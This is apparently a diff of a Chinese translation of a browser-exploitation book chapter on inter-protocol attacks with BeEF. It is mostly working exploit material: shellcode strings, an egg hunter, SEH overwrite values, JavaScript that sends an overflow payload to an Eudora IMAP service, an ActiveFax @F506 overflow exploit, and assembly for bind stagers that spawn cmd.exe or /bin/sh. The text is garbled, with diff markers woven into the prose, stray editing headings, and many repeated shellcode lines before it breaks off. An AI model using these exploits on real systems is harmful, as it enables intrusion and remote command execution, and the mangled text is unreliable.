 "\x14\x15\xe1\xc3\xe5\x45\x6b\x26\xd4\x57\x0f\x22\x45\x67" +
+
 "\x5b\x66\x66\x0c\x09\x93\xfd\x60\x86\x94\xb6\xce\xf0\x9b" +
+
 "\x47\xff\x3c\x77\x8b\x9e\xc0\x8a\xd8\x40\xf8\x44\x2d\x81" +
+
 "\x3d\xb8\xde\xd3\x96\xb6\x4d\xc3\x93\x8b\x4d\xe2\x73\x80" +
+
 "\xee\x9c\xf6\x57\x9a\x16\xf8\x87\x33\x2d\xb2\x3f\x3f\x69" +
+
 "\x63\x41\xec\x6a\x5f\x08\x99\x58\x2b\x8b\x4b\x91\xd4\xbd" +
+
 "\xb3\x7d\xeb\x71\x3e\x7c\x2b\xb5\xa1\x0b\x47\xc5\x5c\x0b" +
+
 "\x9c\xb7\xba\x9e\x01\x1f\x48\x38\xe2\xa1\x9d\xde\x61\xad" +
+
 "\x6a\x95\x2e\xb2\x6d\x7a\x45\xce\xe6\x7d\x8a\x46\xbc\x59" +
+
 "\x0e\x02\x66\xc0\x17\xee\xc9\xfd\x48\x56\xb5\x5b\x02\x75" +
+
 "\xa2\xdd\x49\x12\x07\xd3\x71\xe2\x0f\x64\x01\xd0\x90\xde" +
+
 "\x8d\x58\x58\xf8\x4a\x9e\x73\xbc\xc5\x61\x7c\xbc\xcc\xa5" +
+
 "\x28\xec\x66\x0f\x51\x67\x77\xb0\x84\x27\x27\x1e\x77\x87" +
+
 "\x97\xde\x27\x6f\xf2\xd0\x18\x8f\xfd\x3a\x31\x25\x07\xad" +
+
 "\x92\xa9\x22\x2c\x83\xcb\x2c\x09\x5c\x42\xca\x3f\x72\x02" +
+
 "\x44\xa8\xeb\x0f\x1e\x49\xf3\x9a\x5a\x49\x7f\x28\x9a\x04" +
+
 "\x88\x45\x88\xf1\x78\x10\xf2\x54\x86\x8f\x99\x58\x12\x2b" +
+
 "\x08\x0e\x8a\x31\x6d\x78\x15\xca\x58\xf2\x9c\x5e\x23\x6d" +
+
 "\xe1\x8e\xa3\x6d\xb7\xc4\xa3\x05\x6f\xbc\xf7\x30\x70\x69" +
+
 "\x64\xe9\xe5\x91\xdd\x5d\xad\xf9\xe3\xb8\x99\xa6\x1c\xef" +
+
 "\x1b\x9b\xca\xd6\x99\xed\x78\x3b\x62";
 
 /*
+
  * Egg Hunter (Skape's NtDisplayString technique).
+
  * 原始大小：32 字节
+
  */
+
 var egg_hunter =
+
 "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74" +
+
 "\xef\xb8\x42\x33\x33\x46\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7";
+
 var next_seh   = "\xeb\x06\x90\x90";
+
 var seh        = "\x4e\x3b\x01\x10"; // POP ECX mailcmn.dll
 
 gen_nops = function(count){
+
         var i = 0;
+
         var result = "";
+
         while(i < count ){ result += "\x90";i++;}
+
         log("gen_nops: generated " + result.length + " nops.");
+
         return result;
+
 };
 
 var available_space = 769;
+
 var headers_size = 423;
+
 // 计算需要的 NOP 数量 -> 21
+
 var junk = available_space - stager.length - headers_size; 
+
 var junk_data = gen_nops(junk);
 
 // 最终 Shellcode
+
 var payload = junk_data + stager + next_seh + seh + egg_hunter;
 
 var url = "http://172.16.37.151:143/";
-var xhr = new XMLHttpRequest();
-// 为 WebKit 类浏览器处理
-if (!XMLHttpRequest.prototype.sendAsBinary) {
-  XMLHttpRequest.prototype.sendAsBinary = function (sData) {
-    var nBytes = sData.length, ui8Data = new Uint8Array(nBytes);
-    for (var nIdx = 0; nIdx < nBytes; nIdx++) {
-      ui8Data[nIdx] = sData.charCodeAt(nIdx) & 0xff;
-    }
-    /* send as ArrayBufferView...: */
-    this.send(ui8Data);
-  };
-}
-xhr.open("POST", url, true);
-xhr.setRequestHeader("Content-Type", "text/plain");
-xhr.setRequestHeader('Accept','*/*');
-xhr.setRequestHeader("Accept-Language", "en");
 
-var post_body = "a001 LIST " + "}" + payload + "}" + "\r\n";
-xhr.sendAsBinary(post_body);
+var xhr = new XMLHttpRequest();
+
+// 为 WebKit 类浏览器处理
+
+if (!XMLHttpRequest.prototype.sendAsBinary) {
 ```
 
--   运行上述代码后，将向 `172.16.37.151:143` 上的易受影响的 Eudora IMAP 服务发送 POST 请求，如图 Figure 10-21 所示。
+
+
+`XMLHttpRequest.prototype.sendAsBinary` = function (`sData`) {
+
+var `nBytes` = `sData.length`, `ui8Data` = new `Uint8Array`(`nBytes`);
+
+for (var `nIdx` = 0; `nIdx` < `nBytes`; `nIdx++`) {
+
+`ui8Data`[`nIdx`] = `sData.charCodeAt`(`nIdx`) & 0xff;
+
+}
+
+/* send as ArrayBufferView...: */
+
+this.send(`ui8Data`);
+
+};
+
+}
+
+`xhr.open`("POST", `url`, true);
+
+`xhr.setRequestHeader`("Content-Type", "text/plain");
+
+`xhr.setRequestHeader`('Accept','*/*');
+
+`xhr.setRequestHeader`("Accept-Language", "en");
+
+var `post_body` = "a001 LIST " + "}" + `payload` + "}" + "\r\n";
+
+`xhr.sendAsBinary`(`post_body`);
+
+```
+- 运行上述代码后，将向 `172.16.37.151:143` 上的易受影响的 Eudora IMAP 服务发送 POST 请求，如图 Figure 10-21 所示。
 
 start figure
-
-
 
 <x0.0168><y0.0167>Exploit’s Stager delivery from Firefox<x0.3969><y0.0167>的 Firefox 中的 Stager 交付
 
@@ -13935,9 +14227,9 @@ start figure
 
 end figure
 
-如你在 <x0.3969><y0.3583>Figure 10-22<x0.5625><y0.3667> 中的 netstat 命令所示，你现在可以与目标系统进行交互。
+如你在 <x0.3969><y0.3583>Figure 10-22<x0.5625><y0.3667> 中的 `netstat` 命令所示，你现在可以与目标系统进行交互。
 
-#### ActiveFax 协议利用示例
+### ActiveFax 协议利用示例
 
 ActiveFax 是一个在 Windows 上可用的流行网络传真解决方案，通常出现在内部网络中。Craig Freyman 发现 43 在 RAW 服务器组件（版本 5.01 及以下）处理的命令中存在一个缓冲区溢出漏洞。
 
@@ -13945,9 +14237,9 @@ ActiveFax 允许你使用 LPD、RAW 和 FTP 协议来传输传真。RAW 服务�
 
 RAW 服务器组件可以绑定到任意 TCP 端口。用户手册（第 112 页）建议 44 使用 3000 端口，该端口不在被封禁列表中。实际上，RAW 服务器组件还使用一种容错的协议。LPD 和 FTP 也是容错的，如前所述，但它们的端口已被封禁。因此，你需要关注 RAW 服务器组件。
 
-缓冲区溢出条件出现在 @F506 命令中，该命令负责使用特定文件格式和分辨率导出传真。例如，有效的命令是 @F506 pdf,150@，用于以 PDF 格式导出传真，分辨率为 150。
+缓冲区溢出条件出现在 `@F506` 命令中，该命令负责使用特定文件格式和分辨率导出传真。例如，有效的命令是 `@F506 pdf,150@`，用于以 PDF 格式导出传真，分辨率为 150。
 
-利用这个缓冲区溢出条件比平常稍微复杂一些，因为用于放置 Shellcode 的空间不是连续的。此外，Shellcode 还需要进行编码以去除不良字符。从 \\x00 到 \\x1f 的所有字符都必须被移除，包括 \\x40（@），因为它是命令的前缀/后缀。在这种情况下，Metasploit 的 alpha_mixed 编码器很有用，但它会增加 Shellcode 的大小。
+利用这个缓冲区溢出条件比平常稍微复杂一些，因为用于放置 Shellcode 的空间不是连续的。此外，Shellcode 还需要进行编码以去除不良字符。从 `\x00` 到 `\x1f` 的所有字符都必须被移除，包括 `\x40`（@），因为它是命令的前缀/后缀。在这种情况下，Metasploit 的 `alpha_mixed` 编码器很有用，但它会增加 Shellcode 的大小。
 
 以下代码可以从被钩子的浏览器中启动，它通过利用缓冲区溢出漏洞在内存中注入 Meterpreter Stager：
 
@@ -13964,9 +14256,9 @@ var stager =
 
 // jmp esp in ole32.dll - Win XP SP3 English
 var eip = '\x77\x9c\x55\x77';
+
 // 对栈进行对齐
 var adjust = '\x81\xc4\x24\xfa\xff\xff';
-
 var shellcode_chunk_1 = stager.slice(0,554);
 var shellcode_chunk_2 = stager.slice(554, stager.length);
 
@@ -14005,10 +14297,8 @@ function sendRequest(port, data){
 // 最终 Shellcode
 var payload = shellcode_chunk_2 + fill +
 eip + adjust + shellcode_chunk_1;
-
 var stager_request = "@F506 " + payload + "@\r\n\r\n";
 sendRequest(port, stager_request);
-
 setTimeout(function(){
   xhr.abort();
 }, 2000);
@@ -14016,7 +14306,7 @@ setTimeout(function(){
 
 RAW 服务器的默认套接字超时时间为 60 秒。这一点很重要，因为只有在连接终止后，Shellcode 才会被执行。
 
-如果你用 Ruby 编写这个利用并且有直接连接，那么切断连接会很容易。但请记住，你是从被钩子的浏览器中发起这个利用。别担心！你可以使用 XmlHttpRequest 的 abort() 方法获得类似的功能。在发送数据几秒钟后调用 abort() 可以在不必等待 RAW 服务器关闭连接的情况下执行 Shellcode。
+如果你用 Ruby 编写这个利用并且有直接连接，那么切断连接会很容易。但请记住，你是从被钩子的浏览器中发起这个利用。别担心！你可以使用 XmlHttpRequest 的 `abort()` 方法获得类似的功能。在发送数据几秒钟后调用 `abort()` 可以在不必等待 RAW 服务器关闭连接的情况下执行 Shellcode。
 
 前面的代码运行的结果如下 <x0.3969><y0.575>Figure 10-23<x0.5625><y0.5833>
 
@@ -14029,9 +14319,6 @@ start figure
 end figure
 
 请记住，你在目标内部网络中能控制的唯一东西是被钩子的浏览器。这种情况可能并不理想，因为网络边界过滤解决方案可能会检测到目标服务器内部网络向 Internet 上的主机发出的出站连接。而且， vigilant 系统管理员更有可能在看到内部服务器向未知的 Internet 系统建立连接时感到怀疑，而不是在内部服务器之间建立连接时感到怀疑。
-
-
-
 
 在进入下一节之前，重要的是记住完成 IPE 攻击所需的要求。首先，你正在滥用的协议实现必须能够处理错误并支持 HTTP 请求中的数据封装。其次，你可能需要花费一些初步努力来了解 HTTP 头中包含哪些头信息，并相应地调整负载大小。第三，这些攻击假设目标内部服务器拥有未受阻的出站通道。假设内部服务器可以通过任意端口向外发送流量正逐渐失去可行性，因为企业环境中安全边界控制的层越来越多。最后，在进行相当大的侦察工作之前，找到可供利用的内部系统——不仅限于 IPC 而且也限于 IPE——并非易事。
 
@@ -14067,7 +14354,6 @@ Stager 通过其小巧的体积解决了尺寸问题，足以执行其唯一任�
 ; Version: 1.0 (2nd December 2011)
 ;----------------------------------------------------------;
 [BITS 32]
-
 ;INPUT: EBP is block_api.
 ; by here we will have performed the bind_tcp 
 ;  connection to setup our external web socket
@@ -14076,7 +14362,6 @@ Stager 通过其小巧的体积解决了尺寸问题，足以执行其唯一任�
  ; Output: EDI will be the newly connected clients socket 
  ; Clobbers: EAX, EBX, ESI, EDI, ESP will 
  ; also be modified (-0x1A0)
-
  ;%include "src/block_virtualalloc.asm"
  ; Input: None
  ; Output: EAX holds pointer to the start of buffer 0x1000
@@ -14097,7 +14382,6 @@ allocate_memory:
   call ebp    
  ; save pointer to buffer since eax gets clobbered
  mov esi, eax     
-
 ; Receive the web request containing the stage
 recv:                    
   push byte 0    ; flags
@@ -14106,12 +14390,10 @@ recv:
   push edi     ; external socket
   push 0x5FC8D902   ; hash( "ws2_32.dll", "recv" )
   call ebp      ; recv( external_socket, buffer, size, 0 );
-
 close_handle:
   push edi     ; hObject: external socket
   push 0x528796C6  ; hash(kernel32.dll,CloseHandle)
   call ebp     ; CloseHandle
-  
 ; Search for "cmd=" in the web request for our payload
 find_cmd:    
   cmp dword [esi], 0x3d646d63   ; check if ebx points to "cmd="
@@ -14120,9 +14402,17 @@ find_cmd:
   jmp short find_cmd    ; check next location for "cmd="
 cmd_found:              ; now pointing to start of our command 
 ;  add esi,4     ; starts off pointing at "cmd=" so add 3 
-                 ; (plus  inc eax below) to point to command 
-                 ; ... this compiles to 6 byte opcode
+```
+
+
+
+```asm
+; (plus  inc eax below) to point to command 
+
+; ... this compiles to 6 byte opcode
+
   db 0x83, 0xC6, 0x04  ; add esi,4 ... but only 3 byte opcode
+
   jmp esi    ; jump to our stage payload
 ```
 
@@ -14132,7 +14422,7 @@ Level1 **1.** 在 4444/TCP 上绑定端口，接受 HTTP POST 请求，其中 `c
 
 `cmd` 参数中的二进制 Stage 将在后文中解释。
 
-### Win32 Stage
+## Win32 Stage
 
 BeEF Bind Stage 本质上是一个精简版的 Web 服务器，它会返回标准的 HTTP 响应，并添加适当的 CORS 头部，以允许钩子化的浏览器进行双向通信。也可以使用 JavaScript 实现跨源通信，但这会增加 Stage 的复杂度。
 
@@ -14140,123 +14430,183 @@ Stage 的源码体积远大于 Stager，为节省篇幅，这里不提供完整�
 
 下面的代码负责添加 HTTP 响应头，特别是 `Access-Control-Allow-Origin: *`，从而支持跨域双向通信。
 
-
-
-
--   [Stager 和 Stage 在绑定 TCP 端口和搜索内存中的 cmd= 时共享相同的内部结构。]
-
--   [Stage 的复杂性在于执行操作系统命令、读取其输出并将结果返回到 HTTP 响应中的过程。以下步骤被执行：]
-
--   **Level1 1.** 创建操作系统管道以通过 cmd.exe 重定向输入和输出。这些管道用于传递并随后执行操作系统命令。 **2.** 执行命令并将其输出读取到预分配的缓冲区。 **3.** 将输出缓冲区的内容包含在先前讨论的 CORS 头一起作为 HTTP 响应。 **4.** 客户端（这里是被钩住的浏览器中的 XMLHttpRequest 对象）读取 Stage 返回的响应，该响应包含 Content-Type: text/html，并对其进行解析。
+- [Stager 和 Stage 在绑定 TCP 端口和搜索内存中的 `cmd=` 时共享相同的内部结构。]
+- [Stage 的复杂性在于执行操作系统命令、读取其输出并将结果返回到 HTTP 响应中的过程。以下步骤被执行：]
+- **Level1 1.** 创建操作系统管道以通过 `cmd.exe` 重定向输入和输出。这些管道用于传递并随后执行操作系统命令。 **2.** 执行命令并将其输出读取到预分配的缓冲区。 **3.** 将输出缓冲区的内容包含在先前讨论的 CORS 头一起作为 HTTP 响应。 **4.** 客户端（这里是被钩住的浏览器中的 `XMLHttpRequest` 对象）读取 Stage 返回的响应，该响应包含 `Content-Type: text/html`，并对其进行解析。
 
 /Level1
 
--   [Stager  spawns  the operating system command 的代码如下：]
+- [Stager spawns the operating system command 的代码如下：]
 
-```
+```asm
 [BITS 32]
 
 ; Input:
+
 ; EBP is api_call
+
 ; esp+00  child stdin  read  file descriptor (inherited)
+
 ; esp+04  not used
+
 ; esp+08  not used
+
 ; esp+12  child stdout write file descriptor (inherited)
+
 ; Output: None.
+
 ; Clobbers: EAX, EBX, ECX, EDX, ESI, ESP will also be modified
 
 shell:
+
   push 0x00646D63        ; push our command line: 'cmd',0
+
   mov ebx, esp           ; save a pointer to the command line
+
   push dword [esp+16]  ; child stdout write file descriptor
+
                        ; for process stderr
+
   push dword [esp+20]  ; child stdout write file descriptor
+
                        ; for process stdout
+
   push dword [esp+12]  ; child stdin read file descriptor
+
                        ; for process stdout
+
   xor esi, esi   ; Clear ESI for all the NULL's we need to push
+
   push byte 18   ; We want to place (18 * 4) = 72 null
+
                  ; bytes onto the stack
+
   pop ecx        ; Set ECX for the loop
+
 push_loop:            
+
   push esi           ; push a null dword
+
   ; keep looping until we have pushed enough nulls
+
   loop push_loop     
+
   ; Set the STARTUPINFO Structure's dwFlags 
+
   ; to STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
+
   mov word [esp + 60], 0x0101 
+
   ; Set EAX as a pointer to  STARTUPINFO Structure
+
   lea eax, [esp + 16]
+
   ; Set the size of the STARTUPINFO Structure   
+
   mov byte [eax], 68    
+
   ; perform the call to CreateProcessA
+
   ; Push the pointer to the PROCESS_INFORMATION Structure 
+
   push esp 
+
   ; Push the pointer to the STARTUPINFO Structure 
+
   push eax 
+
   ; The lpCurrentDirectory is NULL so the new process 
+
   ; will have the same current directory as its parent  
+
   push esi 
+
   ; The lpEnvironment is NULL so the new process will 
+
   ; have the same enviroment as its parent 
+
   push esi   
+
   push esi      ; We don’t specify any dwCreationFlags 
+
   inc esi       ; Increment ESI to be one
+
   ; Set bInheritHandles to TRUE in order to inherit
+
   ; all possible handles from the parent
+
   push esi               
+
   dec esi        ; Decrement ESI back down to zero
+
   push esi       ; Set lpThreadAttributes to NULL
+
   push esi       ; Set lpProcessAttributes to NULL
+
   push ebx       ; Set the lpCommandLine to point to "cmd",0
+
   push esi       ; Set lpApplicationName to NULL as we
+
                  ; are using the command line param instead
+
   ; hash( "kernel32.dll", "CreateProcessA" )
+
   push 0x863FCC79  
+
   ; CreateProcessA( 0, &"cmd", 0, 0, TRUE, 0, 0, 0, &si, &pi );
+
   call ebp               
 ```
 
--   [根据代码注释，Windows API 的 CreateProcessA 被用来执行 cmdPOST 参数中包含的命令。]
+- [根据代码注释，Windows API 的 `CreateProcessA` 被用来执行 `cmd`POST 参数中包含的命令。]
+- [当输出缓冲区过小时（例如执行目录列举命令时），预分配的缓冲区可能不足以容纳所有文件列表内容。浏览器无法确认是否完整获取了文件列表。为了判断是否还有更多信息可用，浏览器需要发送额外请求，这可以是一个不包含 `cmd` 参数的空 POST 或一个 GET 请求。如果还有更多输出需要返回，则会在空 POST 请求的响应中返回。此过程会持续，直到 Shellcode 关闭 HTTP 连接，表明没有更多命令输出可供获取。]
 
--   [当输出缓冲区过小时（例如执行目录列举命令时），预分配的缓冲区可能不足以容纳所有文件列表内容。浏览器无法确认是否完整获取了文件列表。为了判断是否还有更多信息可用，浏览器需要发送额外请求，这可以是一个不包含 cmd 参数的空 POST 或一个 GET 请求。如果还有更多输出需要返回，则会在空 POST 请求的响应中返回。此过程会持续，直到 Shellcode 关闭 HTTP 连接，表明没有更多命令输出可供获取。
+## Linux32 Stager 和 Stage
 
-### Linux32 Stager 和 Stage
+- [Bart Leppens 将 Miller 的 BeEF Bind Shellcode 移植到了 Linux，使得可以针对 Linux 服务使用 BeEF Bind。]
+- [Stager 和 Stage 的大小都小于 Windows BeEF Bind 实现，原因是 Windows 将函数存储在 DLL 中，Shellcode 必须先定位 `kernel32` 的基地址，再通过该基地址解析需要调用的函数地址，而不同版本和服务包的 Windows 函数地址会发生变化，导致 Shellcode 需要适配，从而增加了体积。]
+- [Linux 使用系统调用（syscalls）而非 DLL，因此无需额外的函数名称解析和跨平台支持开销，使得 Shellcode 可以更短。Stager 仅 156 字节，Stage 仅 606 字节。]
+- [下面的代码展示了从 `cmd` 参数中执行命令的过程，使用了 `setresuid` 和 `execve` 系统调用：]
 
--   [Bart Leppens 将 Miller 的 BeEF Bind Shellcode 移植到了 Linux，使得可以针对 Linux 服务使用 BeEF Bind。]
-
--   [Stager 和 Stage 的大小都小于 Windows BeEF Bind 实现，原因是 Windows 将函数存储在 DLL 中，Shellcode 必须先定位 kernel32 的基地址，再通过该基地址解析需要调用的函数地址，而不同版本和服务包的 Windows 函数地址会发生变化，导致 Shellcode 需要适配，从而增加了体积。]
-
--   [Linux 使用系统调用（syscalls）而非 DLL，因此无需额外的函数名称解析和跨平台支持开销，使得 Shellcode 可以更短。Stager 仅 156 字节，Stage 仅 606 字节。]
-
--   [下面的代码展示了从 cmd 参数中执行命令的过程，使用了 setresuid 和 execve 系统调用：]
-
-```
+```asm
 ;setresuid(0,0,0)
+
 xor eax, eax
+
 xor ebx, ebx
+
 xor ecx, ecx
+
 xor edx, edx
+
 mov al, 0xa4 ;sys_setresuid16
+
 int 0x80
 
 ;execve("/bin//sh", 0, 0)
+
 xor eax, eax
+
 push eax
+
 push eax
+
 push 0x68732f2f ;//sh
+
 push 0x6e69622f ;/bin
+
 mov ebx, esp
+
 push BYTE 0x0b ;sys_execve
+
 pop eax
+
 int 0x80
 ```
 
--   [该 Shellcode 使用标准的 Linux 系统调用，与 Windows 版类似，完整源码可在 browserhacker.com 上查阅。]
+- [该 Shellcode 使用标准的 Linux 系统调用，与 Windows 版类似，完整源码可在 `browserhacker.com` 上查阅。]
 
-
-
-## 1. 重新划分标题层级
+## 重新划分标题层级
 
 ## 1. 重新划分标题层级（保留合理的# ## ###结构）
 
@@ -14271,6 +14621,8 @@ int 0x80
 ## 2. 优化段落格式，删除多余空行
 
 The rest of the JavaScript code can remain the same. You can now send the first POST request using the IPE technique, which results in the insertion and execution of the BeEF Bind Stager in the memory of the IMAP service. You will notice that port 4444/TCP is now listening on the target host. The second mandatory step is to send the Stage to that listening port. You can use the following code to achieve this:
+
+
 
 ```javascript
 // BeEF Bind Windows 32bit Stage
@@ -14415,168 +14767,66 @@ var BeEF_Bind_Stage =
 "\xc0\xac\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10"+
 "\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48"+
 "\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31"+
-"\xc0\xac\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10"+
-"\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48"+
-"\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31"+
-"\xc0\xac\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10"+
-"\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48"+
-"\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31"+
-"\xc0\xac\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10"+
-"\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48"+
-"\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31"+
-"\xc0\xac\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10"+
-"\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48"+
-"\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31"+
-"\xc0\xac\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10"+
-"\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48"+
-"\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31"+
-"\xc0\xac\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10"+
-"\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48"+
-"\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31"+
-"\xc0\xac\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10"+
-"\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48"+
-"\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31"+
-"\xc0\xac\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10"+
-"\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48"+
-"\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31"+
-"\xc0\xac\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10"+
-"\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48"+
-"\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31"+
-"\xc0\xac\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10"+
-"\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48"+
-"\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31"+
-"\xc0\xac\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10"+
-"\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48"+
-"\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31"+
-"\xc0\xac\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10"+
-"\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48"+
-"\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31"+
-"\xc0\xac\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10"+
-"\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48"+
-"\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31"+
-"\xc0\xac\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10"+
-"\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48"+
-"\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31"+
-"\xc0\xac\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10"+
-"\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48"+
-"\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31"+
-"\xc0\xac\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10"+
-"\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48"+
-"\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31"+
-"\xc0\xac\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10"+
-"\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48"+
-"\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31"+
-"\xc0\xac\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10"+
-"\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48"+
-"\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31"+
-"\xc0\xac\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10"+
-"\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48"+
-"\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31"+
-"\xc0\xac\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10"+
-"\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48"+
-"\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31"+
-"\xc0\xac\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10"+
-"\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48"+
-"\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31"+
-"\xc0\xac\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10"+
-"\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48"+
-"\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31"+
-"\xc0\xac\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10"+
-"\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48"+
-"\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31"+
-"\xc0\xac\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10"+
-"\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48"+
-"\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31"+
-"\xc0\xac\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10"+
-"\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48"+
-"\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31"+
-"\xc0\xac\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10"+
